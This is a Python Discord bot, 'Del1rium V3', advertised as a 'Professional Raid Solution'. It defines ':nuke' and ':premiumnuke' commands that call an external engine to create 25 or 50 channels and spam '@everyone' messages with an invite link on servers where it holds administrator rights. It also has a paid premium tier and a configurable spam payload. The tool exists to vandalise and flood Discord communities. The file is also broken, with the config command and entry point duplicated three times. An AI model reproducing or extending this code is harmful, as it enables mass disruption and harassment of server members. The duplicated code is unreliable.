import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv
import engine # V3 Engine

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ V3 CORE CONFIGURATION ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

# Global Constants
CENTRAL_SERVER_ID = 1453920087194206394
PREMIUM_ROLE_ID = 1458177413325259035
OWNER_ID = 1450919094202269881
LOG_CHANNEL_ID = 1458257075393003561

# Default Payload
DEFAULT_NAME = "premium-raid"
DEFAULT_TEXT = "@everyone premium raid by del1rium https://discord.gg/cJJJWHfnn2 https://sheer-blush-bqrrem0s4b.edgeone.app/1767987541955.jpg.png"
RAID_ICON = "https://sheer-blush-bqrrem0s4b.edgeone.app/1767987541955.jpg.png"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ V3 SESSION MANAGER ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class SessionManager:
    def __init__(self):
        self.configs = {}

    def get(self, user_id):
        return self.configs.get(user_id, {"name": DEFAULT_NAME, "text": DEFAULT_TEXT})

    def update(self, user_id, name, text):
        self.configs[user_id] = {"name": name, "text": text}

sessions = SessionManager()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ V3 BOT INITIALIZATION ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=':', intents=intents, help_command=None)

def is_premium():
    async def predicate(ctx):
        if ctx.author.id == OWNER_ID: return True
        central = bot.get_guild(CENTRAL_SERVER_ID)
        if not central: return False
        member = central.get_member(ctx.author.id)
        if not member or not any(r.id == PREMIUM_ROLE_ID for r in member.roles):
            embed = discord.Embed(title="RESTRICTED ACCESS / ACCESO RESTRINGIDO", description="Premium subscription required.\nSuscripcion Premium requerida.", color=0x2b2d31)
            await ctx.send(embed=embed, delete_after=10)
            return False
        return True
    return commands.check(predicate)

@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    DEL1RIUM V3 - SYSTEM READY / SISTEMA LISTO
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    Operator: {bot.user.name}
    Status: High Performance Active
    Language: Bilingual (EN/ES)
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ V3 COMMAND INTERFACE ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@bot.command(name='help')
async def help_v3(ctx):
    if ctx.channel.id == LOG_CHANNEL_ID: return
    if ctx.guild.id == CENTRAL_SERVER_ID:
        embed = discord.Embed(title="PROTECTED CORE", description="Destructive actions restricted.\nAcciones restringidas.", color=0x2b2d31)
        await ctx.send(embed=embed, delete_after=15)
        return

    await ctx.message.delete()
    embed = discord.Embed(title="V3 OPERATION INTERFACE", description="Select a module for deployment.\nSeleccione un modulo para ejecucion.", color=0x2b2d31)
    embed.add_field(name="PUBLIC MODULE", value="> `:nuke` \nStandard deployment (25 channels).", inline=False)
    embed.add_field(name="PREMIUM MODULE", value="> `:premiumnuke` \nMassive deployment (50 channels).\n\n> `:nukeconfig <name>, <text>` \nConfigure personal payload.", inline=False)
    embed.set_footer(text="Del1rium V3 | Professional Raid Solution")
    await ctx.send(embed=embed, delete_after=60)

@bot.command(name='nuke')
async def nuke_v3(ctx):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not ctx.guild.me.guild_permissions.administrator: return
    await engine.execute_nuke(ctx, bot, "raid-by-del1rium", "@everyone raid by [𝔡𝔢𝔩1𝔯𝔦𝔲𝔪 ℭ𝔬.](https://discord.gg/cJJJWHfnn2)", 25, 500, False, LOG_CHANNEL_ID, RAID_ICON)

@bot.command(name='premiumnuke')
@is_premium()
async def premium_v3(ctx):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not ctx.guild.me.guild_permissions.administrator: return
    config = sessions.get(ctx.author.id)
    await engine.execute_nuke(ctx, bot, config["name"], config["text"], 50, 1000, True, LOG_CHANNEL_ID, RAID_ICON)

@bot.command(name='nukeconfig')
@is_premium()
async def config_v3(ctx, *, args: str = None):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not args or "," not in args:
        embed = discord.Embed(title="SYNTAX ERROR", description="Usage: :nukeconfig name, text", color=0x2b2d31)
        await ctx.send(embed=embed, delete_after=10)
        return

    name, text = [x.strip() for x in args.split(",", 1)]
    if not name or not text: return

    sessions.update(ctx.author.id, name, text)
    try: await ctx.message.delete()
    except: pass

    embed = discord.Embed(title="V3 CONFIG UPDATED", color=0x2b2d31)
    embed.add_field(name="Personal Payload", value=f"Name: `{name}`\nText: ```{text}```", inline=False)
    await ctx.send(embed=embed, delete_after=15)

if __name__ == "__main__":
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("CRITICAL ERROR: TOKEN NOT FOUND")
@bot.command(name='nukeconfig')
@is_premium()
async def nuke_config(ctx, *, args: str = None):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not args or "," not in args:
        embed = discord.Embed(title="SYNTAX ERROR / ERROR DE SINTAXIS", description="Usage / Uso: :nukeconfig name, text", color=0x2b2d31)
        await ctx.send(embed=embed, delete_after=10)
        return

    channel_name, spam_text = [x.strip() for x in args.split(",", 1)]
    if not channel_name or not spam_text: return

    global PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT
    PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT = channel_name, spam_text
    
    try: await ctx.message.delete()
    except: pass

    embed = discord.Embed(title="CONFIGURATION UPDATED / CONFIGURACION ACTUALIZADA", color=0x2b2d31)
    embed.add_field(name="Channels / Canales", value=f"`{channel_name}`", inline=True)
    embed.add_field(name="Text / Texto", value=f"```{spam_text}```", inline=False)
    
    confirmation_msg = await ctx.send(embed=embed)
    await asyncio.sleep(15)
    try: await confirmation_msg.delete()
    except: pass

if __name__ == "__main__":
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("ERROR: TOKEN NOT CONFIGURED / TOKEN NO CONFIGURADO")
@bot.command(name='nukeconfig')
@is_premium()
async def nuke_config(ctx, *, args: str = None):
    if ctx.guild.id == CENTRAL_SERVER_ID: return
    if not args or "," not in args:
        embed = discord.Embed(title="SYNTAX ERROR / ERROR DE SINTAXIS", description="Usage / Uso: :nukeconfig name, text", color=0x2b2d31)
        await ctx.send(embed=embed, delete_after=10)
        return

    channel_name, spam_text = [x.strip() for x in args.split(",", 1)]
    if not channel_name or not spam_text: return

    global PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT
    PREMIUM_CHANNEL_NAME, PREMIUM_SPAM_TEXT = channel_name, spam_text
    
    try: await ctx.message.delete()
    except: pass

    embed = discord.Embed(title="CONFIGURATION UPDATED / CONFIGURACION ACTUALIZADA", color=0x2b2d31)
    embed.add_field(name="Channels / Canales", value=f"`{channel_name}`", inline=True)
    embed.add_field(name="Text / Texto", value=f"```{spam_text}```", inline=False)
    
    confirmation_msg = await ctx.send(embed=embed)
    await asyncio.sleep(15)
    try: await confirmation_msg.delete()
    except: pass

if __name__ == "__main__":
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("ERROR: TOKEN NOT CONFIGURED / TOKEN NO CONFIGURADO")
